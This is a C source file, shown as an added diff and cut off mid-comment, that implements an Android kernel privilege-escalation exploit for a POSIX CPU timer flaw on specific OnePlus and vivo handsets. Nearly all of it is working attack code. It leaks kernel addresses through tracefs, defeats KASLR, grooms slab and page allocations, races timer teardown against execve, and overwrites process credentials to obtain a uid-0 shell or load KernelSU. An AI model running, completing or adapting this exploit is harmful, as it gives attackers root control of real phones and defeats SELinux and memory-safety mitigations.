@@ -1,0 +1,3346 @@
+/*
+ * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
+ * Target : OnePlus PLZ110 (SM8850 / canoe), Android 17
+ *          vivo V2505A (SM8850 / canoe), Android 16
+ * Kernel : 6.12.69-android16-6-g242e1a07f878-ab15865446-4k
+ *          6.12.23-android16-5-g41f4cb1fa7c7-abogki465038634-4k
+ * SELinux: Enforcing
+ * Patches: absent
+ * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
+ *
+ * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
+ * The trigger, slab layout and offsets are the same; the do_timer_create
+ * call site and the tracefs event ids are per-build and are re-derived here.
+ *
+ * Two endgames:
+ *
+ *   default / shell / verify
+ *     One zero write to the child's real cred clears uid/gid.  The child
+ *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
+ *     shell-domain root with only the bounding-set capabilities.
+ *
+ *   fake
+ *     Point task->cred at a fake full-capability cred in the reclaimed
+ *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
+ *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
+ *     blob.  The worker execs ksud late-load, which resolves the installed
+ *     manager's libksud.so and loads the matching android16-6.12 module.
+ *     The parent parks with its socket buffers holding the fake cred page.
+ *
+ * The trigger leaves a stale timerqueue node.  Failed plants park without
+ * reaping and rename themselves to a holder, so another attempt may run in
+ * the same boot; reboot clears the retained state.  Event ids and the
+ * linear-map base are discovered at runtime; the tracefs metadata files are
+ * not readable from the shell domain.
+ */
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdarg.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <elf.h>
+#include <poll.h>
+#include <sched.h>
+#include <signal.h>
+#include <stdint.h>
+#include <stdatomic.h>
+#include <time.h>
+#include <pthread.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <sys/syscall.h>
+#include <sys/wait.h>
+#include <sys/prctl.h>
+#include <sys/utsname.h>
+extern char **environ;
+#include <sys/resource.h>
+#include <sys/stat.h>
+#include <dirent.h>
+
+#define TR "/sys/kernel/tracing"
+#define CPU_TRIG 2
+#define NTIMERS 2048
+#define VICTIM_IDX 1024
+#define PREFILL_TIMERS 2048
+#define VMA_COUNT 50000
+#define HELPER_STACK (1 << 20)
+#define LOCKERS 3
+#define PAGE 4096UL
+#define SOCKBUF 8192
+
+/* Fast tuning (ported from the PYB110 chain): wait for the victim page to
+ * reach the buddy allocator first, then spray one 32 MiB round; cap the wait
+ * at 1.2 s and churn timers on the victim CPU when the slab page is stuck. */
+#define WAIT_FREE_MS 2500
+#define WAIT_HIT_MS 3000
+#define CHURN_ROUND_MS 400
+#define CHURN_MAX 3
+#define CHURN_TIMERS 4096
+#define SPRAY_MAX_ROUNDS 3
+#define SPRAY_ROUND_MS 250
+
+
+/* Shared BTF/slab layout. */
+#if defined(PKJ110_66118) || defined(KERNEL_66127)
+#define TIMER_REQ 0x108ULL
+#define TIMER_ALLOC 0x140ULL
+#define CRED_REQ 0xb8ULL
+#define CRED_ALLOC 0xc0ULL
+#define CRED_UID_OFF 0x8ULL
+#define OFF_TASK_CRED 0x820ULL
+#elif defined(KERNEL_61821)
+#define TIMER_REQ 0x180ULL
+#define TIMER_ALLOC 0x180ULL
+#define CRED_REQ 0xb8ULL
+#define CRED_ALLOC 0xc0ULL
+#define CRED_UID_OFF 0x8ULL
+#define OFF_TASK_CRED 0x908ULL
+#define KIT_IT_OFF 0xe0ULL
+#else
+#define TIMER_REQ 0x100ULL
+#define TIMER_ALLOC 0x100ULL
+#define CRED_REQ 0xb8ULL
+#define CRED_ALLOC 0xc0ULL
+#define CRED_UID_OFF 0x8ULL
+#define OFF_TASK_CRED 0x900ULL
+#endif
+#ifndef KIT_IT_OFF
+#define KIT_IT_OFF 0x78ULL
+#endif
+#ifndef CRED_SITE_LOW21
+#define CRED_SITE_LOW21 0ULL
+#define CRED_SITE_LOW21_2 0ULL
+#endif
+/* vivo's task_struct_vendor_size_setup() appends a device-specific tail
+ * (capped at 0x500) to arch_task_struct_size, so the task cache object size
+ * varies per device.  The copy_process+0x140 call site is unique to
+ * alloc_task_struct_node, so accept the whole plausible size range. */
+#define TASK_ALLOC_MIN 0x1000ULL
+#define TASK_ALLOC_MAX 0x1a00ULL
+#define FULLCAP 0x1ffffffffffULL
+#define SELINUX_BLOB_OFF 0x8ULL
+#define SELINUX_SID_KERNEL 1U
+
+#define CHILD_HELLO 0x52445931
+#define CHILD_MAGIC 0x50474552
+
+enum child_stage
+{
+    CHILD_STAGE_NONE = 0,
+    CHILD_STAGE_WAKE_READ_FAIL = 1,
+    CHILD_STAGE_WOKE = 2,
+};
+
+struct child_report
+{
+    int magic;
+    int stage;
+    int uid, euid;
+    int setuid_ret, setuid_errno;
+    int ruid, reuid, rsuid;
+    int wake_ret, wake_errno;
+    unsigned long long gate_addr;
+};
+
+static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
+static _Atomic int g_exec_tid, g_target_tgid;
+static void *g_frag_base;
+static size_t g_frag_len;
+static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
+static int g_timer_go_r = -1, g_timer_go_w = -1;
+static int g_cpu = CPU_TRIG;
+static unsigned long long g_base;
+static unsigned long long g_slide;
+/* PATCH: KASLR slide 的 mod-2MiB 分量 */
+static unsigned long long g_low_adj = 0ULL;
+static int g_held;
+static long g_start_ms;
+static pid_t g_fake_child = -1;
+static int g_fake_stage;
+static unsigned long long g_child_slide;
+#if defined(HOOKS_GATE)
+static unsigned long long g_child_data;
+#endif
+static unsigned long long g_child_task;
+static unsigned g_t_page_alloc, g_t_page_free;
+
+static void logf(const char *fmt, ...);
+static unsigned long long leak_cred(unsigned char *raw,
+                                    pid_t *out_pid, int *out_go, int *out_st,
+                                    int shell_mode,
+                                    unsigned long long *task_out);
+
+static void slab_usage(const char *tag)
+{
+    FILE *f = fopen("/proc/slabinfo", "r");
+    char line[256];
+
+    if (!f)
+        return;
+    while (fgets(line, sizeof(line), f))
+    {
+        unsigned active = 0, total = 0;
+
+        if (strncmp(line, "posix_timers_cache", 18))
+            continue;
+        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
+            logf("[slab] %s active=%u total=%u\n", tag, active, total);
+        break;
+    }
+    fclose(f);
+}
+
+static void logf(const char *fmt, ...)
+{
+    va_list ap;
+
+    va_start(ap, fmt);
+    vprintf(fmt, ap);
+    va_end(ap);
+    (void)fsync(STDOUT_FILENO);
+}
+
+static int wr(const char *p, const char *s)
+{
+    int fd = open(p, O_WRONLY);
+    if (fd < 0)
+        return -1;
+    int r = write(fd, s, strlen(s));
+    close(fd);
+    return r < 0 ? -1 : 0;
+}
+static void pin(int cpu)
+{
+    cpu_set_t set;
+    CPU_ZERO(&set);
+    CPU_SET(cpu, &set);
+    sched_setaffinity(0, sizeof(set), &set);
+}
+
+static unsigned u32(const unsigned char *b, size_t o)
+{
+    unsigned v;
+    memcpy(&v, b + o, 4);
+    return v;
+}
+static unsigned long long u64(const unsigned char *b, size_t o)
+{
+    unsigned long long v;
+    memcpy(&v, b + o, 8);
+    return v;
+}
+
+static void enable_events(void)
+{
+    static const char *evs[] = {
+        "enable_event:kmem:kmem_cache_alloc\n",
+        "enable_event:kmem:mm_page_free\n",
+        "enable_event:kmem:mm_page_alloc\n",
+    };
+    wr(TR "/events/kmem/rss_stat/enable", "1\n");
+    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
+        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
+    /* Some kernels drop enable_event triggers; the shell domain usually can
+     * write the per-event enable files directly. */
+    wr(TR "/events/kmem/kmem_cache_alloc/enable", "1\n");
+    wr(TR "/events/kmem/mm_page_free/enable", "1\n");
+    wr(TR "/events/kmem/mm_page_alloc/enable", "1\n");
+}
+
+/* The rss_stat trigger only exists to enable the kmem events for a shell
+ * domain.  Leaving it enabled makes rss records flood every raw buffer and
+ * slows every later scan; drop the triggers and the event right after the
+ * target events are on (they stay enabled independently). */
+static void stop_rss_flood(void)
+{
+    wr(TR "/events/kmem/rss_stat/trigger", "!enable_event:kmem:kmem_cache_alloc\n");
+    wr(TR "/events/kmem/rss_stat/trigger", "!enable_event:kmem:mm_page_free\n");
+    wr(TR "/events/kmem/rss_stat/trigger", "!enable_event:kmem:mm_page_alloc\n");
+    wr(TR "/events/kmem/rss_stat/enable", "0\n");
+    wr(TR "/events/kmem/kmem_cache_alloc/enable", "0\n");
+    wr(TR "/events/kmem/mm_page_free/enable", "0\n");
+    wr(TR "/events/kmem/mm_page_alloc/enable", "0\n");
+}
+
+static void churn_timers(int n)
+{
+    timer_t *v = calloc((size_t)n, sizeof(*v));
+    struct sigevent ev;
+    int made = 0;
+
+    if (!v)
+        return;
+    memset(&ev, 0, sizeof(ev));
+    ev.sigev_notify = SIGEV_NONE;
+    pin(CPU_TRIG);
+    for (int i = 0; i < n; i++)
+    {
+        if (timer_create(CLOCK_MONOTONIC, &ev, &v[i]))
+            break;
+        made++;
+    }
+    for (int i = 0; i < made; i++)
+        timer_delete(v[i]);
+    free(v);
+    pin(g_cpu);
+    logf("[churn] n=%d made=%d\n", n, made);
+}
+
+static void drain_cpu(int cpu)
+{
+    unsigned char tmp[65536];
+    char path[128];
+    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+    int fd = open(path, O_RDONLY | O_NONBLOCK);
+    if (fd < 0)
+        return;
+    while (read(fd, tmp, sizeof(tmp)) > 0)
+        ;
+    close(fd);
+}
+static void trace_start(void)
+{
+    wr(TR "/tracing_on", "0");
+    wr(TR "/trace", "\n");
+    drain_cpu(g_cpu);
+    wr(TR "/tracing_on", "1");
+}
+static void trace_stop(void) { wr(TR "/tracing_on", "0"); }
+
+static long read_cpu(int cpu, unsigned char *buf, size_t cap)
+{
+    char path[128];
+    size_t tot = 0;
+    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+    int fd = open(path, O_RDONLY | O_NONBLOCK);
+    if (fd < 0)
+        return -1;
+    while (tot < cap)
+    {
+        ssize_t r = read(fd, buf + tot, cap - tot);
+        if (r <= 0)
+            break;
+        tot += (size_t)r;
+    }
+    close(fd);
+    return (long)tot;
+}
+
+static int is_kernel_ptr(unsigned long long v)
+{
+    return (v >> 48) == 0xffffULL;
+}
+
+/*
+ * Raw ftrace field layout (per-boot ids have no readable metadata):
+ *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
+ *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
+ */
+static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
+                             unsigned long long *out, int max,
+                             unsigned long long *first_site)
+{
+    int cnt = 0;
+
+    for (size_t i = 8; i + 32 <= n; i += 4)
+    {
+        unsigned long long site, ptr;
+
+        if (u32(b, i - 4) != (unsigned)pid)
+            continue;
+        site = u64(b, i);
+        if ((site & 0x1fffffULL) != ((TIMER_SITE_LOW21 + g_low_adj) & 0x1fffffULL))
+            continue;
+        ptr = u64(b, i + 8);
+        /* 6.18 records only the real object size in bytes_alloc; bytes_req
+         * may be zero for dedicated caches. */
+        if ((u64(b, i + 24) != TIMER_ALLOC &&
+             u64(b, i + 24) != TIMER_REQ) ||
+            !is_kernel_ptr(ptr))
+            continue;
+        if (!cnt && first_site)
+            *first_site = site;
+        if (cnt < max)
+            out[cnt++] = ptr;
+    }
+    return cnt;
+}
+
+static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
+                            unsigned long long *site_out,
+                            unsigned long long *ptr_out)
+{
+    int found = 0;
+
+    for (size_t i = 16; i + 24 <= n; i += 4)
+    {
+        unsigned long long site, ptr;
+
+        if (u32(b, i - 12) != (unsigned)pid)
+            continue;
+        ptr = u64(b, i);
+        if (!is_kernel_ptr(ptr))
+            continue;
+        site = u64(b, i - 8);
+        if (!is_kernel_ptr(site))
+            continue;
+#if CRED_SITE_LOW21
+        if ((site & 0x1fffffULL) != CRED_SITE_LOW21 &&
+            (site & 0x1fffffULL) != CRED_SITE_LOW21_2)
+            continue;
+        if (u64(b, i + 16) < 0x40)
+            continue;
+#else
+        if ((u64(b, i + 8) != CRED_REQ && u64(b, i + 8) != 0 &&
+             u64(b, i + 8) != CRED_ALLOC) ||
+            (u64(b, i + 16) != CRED_ALLOC && u64(b, i + 16) != CRED_REQ))
+            continue;
+#endif
+        if (!found)
+        {
+            *site_out = site;
+            *ptr_out = ptr;
+        }
+        found++;
+    }
+    return found;
+}
+
+static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
+                            unsigned long long *out)
+{
+    int found = 0;
+
+    for (size_t i = 8; i + 32 <= n; i += 4)
+    {
+        unsigned long long site, ptr, req, alloc;
+
+        if (u32(b, i - 4) != (unsigned)pid)
+            continue;
+        site = u64(b, i);
+        if ((site & 0x1fffffULL) != ((COPY_PROCESS_LOW21 + g_low_adj) & 0x1fffffULL))
+            continue;
+        ptr = u64(b, i + 8);
+        req = u64(b, i + 16);
+        alloc = u64(b, i + 24);
+        if (!is_kernel_ptr(ptr))
+            continue;
+        if (alloc < TASK_ALLOC_MIN || alloc > TASK_ALLOC_MAX)
+            continue;
+        *out = ptr;
+        found++;
+    }
+    return found;
+}
+
+static int scan_page_free(const unsigned char *b, size_t n,
+                          unsigned long long pfn)
+{
+    for (size_t i = 16; i + 12 <= n; i += 4)
+    {
+        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
+            continue;
+        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
+            return 1;
+    }
+    return 0;
+}
+
+struct page_pair
+{
+    unsigned long long pfn;
+    unsigned alloc_type, free_type, hits;
+};
+
+/*
+ * Page event ids are assigned at boot and the tracefs metadata is root-only.
+ * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
+ */
+static int discover_page_types(unsigned char *raw)
+{
+    struct page_pair pairs[2048];
+    int np = 0, me = getpid();
+    size_t len = 1024 * PAGE;
+    unsigned char *m;
+    long n;
+
+    memset(pairs, 0, sizeof(pairs));
+    trace_stop();
+    wr(TR "/trace", "\n");
+    for (int c = 0; c < 8; c++)
+        drain_cpu(c);
+    trace_start();
+    m = mmap(NULL, len, PROT_READ | PROT_WRITE,
+             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (m == MAP_FAILED)
+    {
+        trace_stop();
+        return -1;
+    }
+    /* THP-heavy kernels would back this with a couple of huge folios and
+     * leave too few page records to identify the event ids. */
+    madvise(m, len, MADV_NOHUGEPAGE);
+    for (size_t i = 0; i < len; i += PAGE)
+        m[i] = 1;
+    munmap(m, len);
+    usleep(30000);
+    trace_stop();
+
+    n = read_cpu(g_cpu, raw, 32u << 20);
+    if (n <= 0)
+        return -1;
+    for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
+    {
+        unsigned long long pfn = u64(raw, i);
+        unsigned order, type;
+
+        if (pfn >= (1ULL << 26))
+            continue;
+        order = u32(raw, i + 8);
+        if (order > 10)
+            continue;
+        if (u32(raw, i - 4) != (unsigned)me)
+            continue;
+        type = u32(raw, i - 8) & 0xffff;
+        if (!type || type > 1024)
+            continue;
+        for (int k = 0; k < np; k++)
+        {
+            if (pairs[k].pfn == pfn)
+            {
+                if (!pairs[k].alloc_type)
+                    pairs[k].alloc_type = type;
+                else if (!pairs[k].free_type)
+                    pairs[k].free_type = type;
+                pairs[k].hits++;
+                goto next;
+            }
+        }
+        if (np < 2048)
+        {
+            pairs[np].pfn = pfn;
+            pairs[np].alloc_type = type;
+            pairs[np].hits = 1;
+            np++;
+        }
+    next:;
+    }
+
+    {
+        struct type_vote
+        {
+            unsigned alloc_type, free_type;
+            int count;
+        } tv[64];
+        int nv = 0, bi = -1, best = 0;
+
+        /* A single pfn's first record is its alloc event and the next one is
+         * its free event; vote the (alloc,free) type pair across every pfn so
+         * one noisy record cannot pick the wrong ids. */
+        for (int k = 0; k < np; k++)
+        {
+            unsigned a = pairs[k].alloc_type, f = pairs[k].free_type;
+            int j;
+
+            if (!a || !f || a == f)
+                continue;
+            for (j = 0; j < nv; j++)
+                if (tv[j].alloc_type == a && tv[j].free_type == f)
+                {
+                    tv[j].count++;
+                    break;
+                }
+            if (j == nv && nv < (int)(sizeof(tv) / sizeof(tv[0])))
+            {
+                tv[nv].alloc_type = a;
+                tv[nv].free_type = f;
+                tv[nv].count = 1;
+                nv++;
+            }
+        }
+        for (int j = 0; j < nv; j++)
+            if (bi < 0 || tv[j].count > best)
+            {
+                bi = j;
+                best = tv[j].count;
+            }
+        if (bi < 0 || best < 4)
+        {
+            logf("[-] page event ids not found (records=%zu pairs=%d votes=%d)\n",
+                 (size_t)n, np, best);
+            return -1;
+        }
+        g_t_page_alloc = tv[bi].alloc_type;
+        g_t_page_free = tv[bi].free_type;
+        logf("[ids] page_alloc=%u page_free=%u pairs=%d votes=%d\n",
+             g_t_page_alloc, g_t_page_free, np, best);
+    }
+    return 0;
+}
+
+/*
+ * Vote the linear-map base from the target's timer slabs and same-PID order-1
+ * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
+ * roughly one vote per slab.
+ */
+struct base_slot
+{
+    unsigned long long key;
+    int cnt;
+};
+
+static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
+                                     const unsigned long long *ptrs, int nrec,
+                                     int *out_slabs, int *out_pfns)
+{
+    enum
+    {
+        MAXS = 256,
+        MAXP = 512,
+        HBITS = 16,
+        HSIZE = 1 << HBITS
+    };
+    unsigned long long slabs[MAXS], pfns[MAXP];
+    static struct base_slot tab[HSIZE];
+    int ns = 0, np = 0;
+    unsigned long long best_base = 0, best_cnt = 0;
+
+    memset(tab, 0, sizeof(tab));
+    for (int i = 0; i < nrec && ns < MAXS; i++)
+    {
+        unsigned long long s = ptrs[i] & ~0x1fffULL;
+        int dup = 0;
+
+        for (int j = 0; j < ns; j++)
+            if (slabs[j] == s)
+            {
+                dup = 1;
+                break;
+            }
+        if (!dup)
+            slabs[ns++] = s;
+    }
+    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
+    {
+        unsigned long long pfn = u64(b, i);
+        int dup = 0;
+
+        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
+            u32(b, i - 4) != (unsigned)pid ||
+            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
+            continue;
+        for (int j = 0; j < np; j++)
+            if (pfns[j] == pfn)
+            {
+                dup = 1;
+                break;
+            }
+        if (!dup)
+            pfns[np++] = pfn;
+    }
+    for (int i = 0; i < ns; i++)
+    {
+        for (int j = 0; j < np; j++)
+        {
+            unsigned long long base = slabs[i] - (pfns[j] << 12);
+
+            if ((base & 0x1fffffULL) || base < 0xffffff0000000000ULL ||
+                base >= 0xffffffc000000000ULL)
+                continue;
+            unsigned h = (unsigned)((base >> 12) * 2654435761u) &
+                         (HSIZE - 1);
+
+            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
+            {
+                if (!tab[h].key)
+                {
+                    tab[h].key = base;
+                    tab[h].cnt = 1;
+                    break;
+                }
+                if (tab[h].key == base)
+                {
+                    tab[h].cnt++;
+                    break;
+                }
+            }
+        }
+    }
+    for (int i = 0; i < HSIZE; i++)
+        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
+        {
+            best_cnt = tab[i].cnt;
+            best_base = tab[i].key;
+        }
+    *out_slabs = ns;
+    *out_pfns = np;
+    return best_cnt >= 8 ? best_base : 0;
+}
+
+static void __attribute__((noinline)) dump_timer_sites(const unsigned char *b,
+                                                       size_t n)
+{
+    int shown = 0;
+
+    for (size_t i = 8; i + 32 <= n && shown < 4; i += 4)
+    {
+        unsigned long long site = u64(b, i);
+
+        if ((site & 0x1fffffULL) != ((TIMER_SITE_LOW21 + g_low_adj) & 0x1fffffULL))
+            continue;
+        logf("[tdbg] pid=%u req=%#llx alloc=%#llx site=%#llx\n",
+             u32(b, i - 4), u64(b, i + 16), u64(b, i + 24), site);
+        shown++;
+    }
+}
+
+static void (*volatile g_dump_timer_sites)(const unsigned char *, size_t) =
+    dump_timer_sites;
+
+static unsigned long long calibrate_base(unsigned char *raw)
+{
+    unsigned long long hist[64] = {0}, hcnt[64] = {0};
+    unsigned long long recent[64];
+    unsigned long long ptrs[512];
+    int hc = 0, rn = 0, made = 0, me = getpid(), ntimers = 0;
+    long n;
+
+    trace_start();
+    for (int i = 0; i < 512; i++)
+    {
+        struct sigevent ev;
+        timer_t t;
+
+        memset(&ev, 0, sizeof(ev));
+        ev.sigev_notify = SIGEV_NONE;
+        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
+            break;
+        made++;
+    }
+    usleep(3000);
+    trace_stop();
+    n = read_cpu(g_cpu, raw, 32u << 20);
+    if (n <= 0)
+        return 0;
+
+    {
+        int c = 0;
+
+        /* PATCH: KASLR slide 的 mod-2MiB 部分未知，4 个候选各试一遍。 */
+        {
+            static const unsigned long long cands[4] = {
+                0ULL, 0x80000ULL, 0x100000ULL, 0x180000ULL};
+            int best_ci = 0;
+
+            for (int ci = 0; ci < 4; ci++) {
+                int cc;
+
+                g_low_adj = cands[ci];
+                cc = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
+                if (cc > c) { c = cc; best_ci = ci; }
+            }
+            g_low_adj = cands[best_ci];
+            c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);
+        }
+
+        ntimers = c;
+        logf("[calib] timers=%d low_adj=%#llx\n", c, g_low_adj);
+        {
+            volatile int zero = (c == 0);
+
+            if (zero && g_dump_timer_sites)
+                g_dump_timer_sites(raw, (size_t)n);
+        }
+
+        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
+        {
+            unsigned long long pfn = u64(raw, i);
+
+            if (pfn >= (1ULL << 26) || u32(raw, i + 8) > 10 ||
+                u32(raw, i - 4) != (unsigned)me ||
+                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
+                continue;
+            if (rn == 64)
+                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
+            recent[rn++] = pfn;
+        }
+        for (int i = 0; i < c; i++)
+        {
+            unsigned long long slab = ptrs[i] & ~0x1fffULL;
+
+            for (int j = 0; j < rn; j++)
+            {
+                unsigned long long base = slab - (recent[j] << 12);
+                int f = 0;
+
+                if ((base & 0x1fffffULL) || base < 0xffffff0000000000ULL ||
+                    base >= 0xffffffc000000000ULL)
+                    continue;
+
+                for (int k = 0; k < hc; k++)
+                    if (hist[k] == base)
+                    {
+                        hcnt[k]++;
+                        f = 1;
+                        break;
+                    }
+                if (!f && hc < 64)
+                {
+                    hist[hc] = base;
+                    hcnt[hc] = 1;
+                    hc++;
+                }
+            }
+        }
+    }
+    {
+        unsigned long long best = 0, bestc = 0;
+
+        for (int k = 0; k < hc; k++)
+            if (hcnt[k] > bestc)
+            {
+                bestc = hcnt[k];
+                best = hist[k];
+            }
+        logf("[base] made=%d timers=%d pages=%d best=%#llx count=%llu\n",
+             made, ntimers, rn, best, bestc);
+        return bestc >= 4 ? best : 0;
+    }
+}
+
+static void kick_rss(void)
+{
+    size_t n = (size_t)32 << 20;
+    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
+                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+    if (p == MAP_FAILED)
+        return;
+    madvise(p, n, MADV_NOHUGEPAGE);
+    for (size_t i = 0; i < n; i += PAGE)
+        p[i] = 1;
+    munmap(p, n);
+}
+
+static timer_t *g_prefill;
+
+static void prefill_timers(int n)
+{
+    struct sigevent ev;
+
+    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
+    if (!g_prefill)
+        return;
+    memset(&ev, 0, sizeof(ev));
+    ev.sigev_notify = SIGEV_NONE;
+    for (int i = 0; i < n; i++)
+    {
+        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
+            break;
+    }
+}
+
+static int prepare_fragmented_range(void)
+{
+    size_t len = (size_t)VMA_COUNT * PAGE;
+    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
+    void *base;
+    if (fd < 0 || ftruncate(fd, PAGE))
+        return -1;
+    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (base == MAP_FAILED)
+        return -1;
+    for (unsigned long i = 0; i < VMA_COUNT; i++)
+    {
+        void *want = (char *)base + i * PAGE;
+        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
+            return -1;
+    }
+    close(fd);
+    g_frag_base = base;
+    g_frag_len = len;
+    return 0;
+}
+
+static int locker_fn(void *x)
+{
+    int prot = PROT_NONE;
+    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
+    (void)x;
+    pin(slot ? 3 : 1);
+    while (!atomic_load(&g_go))
+        sched_yield();
+    atomic_fetch_add(&g_locker_started, 1);
+    while (!atomic_load(&g_stop))
+    {
+        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
+        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
+    }
+    _exit(0);
+}
+static int killer_fn(void *x)
+{
+    int tid, tgid;
+    (void)x;
+    pin(2);
+    while (!(tid = atomic_load(&g_exec_tid)))
+        sched_yield();
+    tgid = atomic_load(&g_target_tgid);
+    for (;;)
+    {
+        long r = syscall(SYS_tgkill, tgid, tid, 0);
+        if (r < 0 && errno == ESRCH)
+            break;
+        sched_yield();
+    }
+    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
+    atomic_store(&g_stop, 1);
+    _exit(0);
+}
+static int spawn_vm_helper(int (*fn)(void *))
+{
+    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
+                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (st == MAP_FAILED)
+        return -1;
+    int p = clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, NULL);
+    if (p < 0)
+        munmap(st, HELPER_STACK);
+    return p;
+}
+
+static void *exec_thread(void *x)
+{
+    struct sigevent ev_none, ev_victim;
+    struct itimerspec dormant;
+    char b = 'R', ack;
+    char *const argv[] = {(char *)"", NULL};
+    char *const envp[] = {NULL};
+    (void)x;
+    pin(2);
+    prctl(PR_SET_NAME, "yexec", 0, 0, 0);
+    memset(&ev_none, 0, sizeof(ev_none));
+    ev_none.sigev_notify = SIGEV_NONE;
+    memset(&ev_victim, 0, sizeof(ev_victim));
+    ev_victim.sigev_notify = SIGEV_SIGNAL;
+    ev_victim.sigev_signo = SIGRTMIN;
+    memset(&dormant, 0, sizeof(dormant));
+    dormant.it_value.tv_sec = 3600;
+
+    if (write(g_ready_w, &b, 1) != 1)
+        _exit(117);
+    if (read(g_ack_r, &ack, 1) != 1)
+        _exit(118);
+
+    for (int i = 0; i < NTIMERS; i++)
+    {
+        timer_t t;
+        struct sigevent *e = (i == VICTIM_IDX) ? &ev_victim : &ev_none;
+        if (timer_create(CLOCK_THREAD_CPUTIME_ID, e, &t))
+            _exit(120);
+        if (i == VICTIM_IDX && timer_settime(t, 0, &dormant, NULL))
+            _exit(121);
+    }
+    {
+        int tid = (int)syscall(SYS_gettid);
+        atomic_store(&g_exec_tid, tid);
+        if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
+            _exit(122);
+    }
+    /* Keep the target paused until the parent has captured V and armed the
+     * spray; the free still has not happened at this point. */
+    if (g_timer_go_r >= 0)
+    {
+        char tgo;
+
+        if (read(g_timer_go_r, &tgo, 1) != 1)
+            _exit(124);
+    }
+    atomic_store(&g_go, 1);
+    while (atomic_load(&g_locker_started) < LOCKERS)
+        sched_yield();
+    for (volatile unsigned long i = 0; i < 5000000UL; i++)
+        __asm__ volatile("" ::: "memory");
+    execve("/proc/self/exe", argv, envp);
+    _exit(123);
+}
+
+static void run_target(void)
+{
+    pthread_t th;
+    sigset_t set;
+    atomic_store(&g_target_tgid, (int)getpid());
+    pin(2);
+    if (prepare_fragmented_range())
+        _exit(110);
+    for (int i = 0; i < LOCKERS; i++)
+        if (spawn_vm_helper(locker_fn) < 0)
+            _exit(111);
+    if (spawn_vm_helper(killer_fn) < 0)
+        _exit(112);
+    sigemptyset(&set);
+    sigaddset(&set, SIGRTMIN);
+    pthread_sigmask(SIG_BLOCK, &set, NULL);
+    if (pthread_create(&th, NULL, exec_thread, NULL))
+        _exit(114);
+    for (;;)
+        sched_yield();
+}
+
+static int wait_zombie(pid_t pid, siginfo_t *si)
+{
+    struct timespec pause = {.tv_nsec = 200000};
+    for (int i = 0; i < 50000; i++)
+    {
+        memset(si, 0, sizeof(*si));
+        if (waitid(P_PID, (id_t)pid, si, WEXITED | WNOHANG | WNOWAIT))
+            return -1;
+        if (si->si_pid == pid)
+            return 0;
+        nanosleep(&pause, NULL);
+    }
+    return -1;
+}
+
+static long now_ms(void)
+{
+    struct timespec ts;
+    clock_gettime(CLOCK_MONOTONIC, &ts);
+    return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
+}
+
+static void park_forever(const char *why)
+{
+    /* Any parked plant becomes a holder: rename so the runner's stale check
+     * skips it and a same-boot rerun is never blocked. */
+    prctl(PR_SET_NAME, "t61269-hold");
+    logf("[!] %s -- parking without reap (zombie held)\n", why);
+    fflush(stdout);
+    for (;;)
+        pause();
+}
+
+/* Failure exit aligned with the 6.18 chain: the plant process exits 13 so a
+ * second attempt may run in the same boot.  When failed plants left zombies
+ * held (g_held > 0) reaping them would run rb_erase on foreign memory, so
+ * the process parks instead and is renamed t61269-hold to be skipped by the
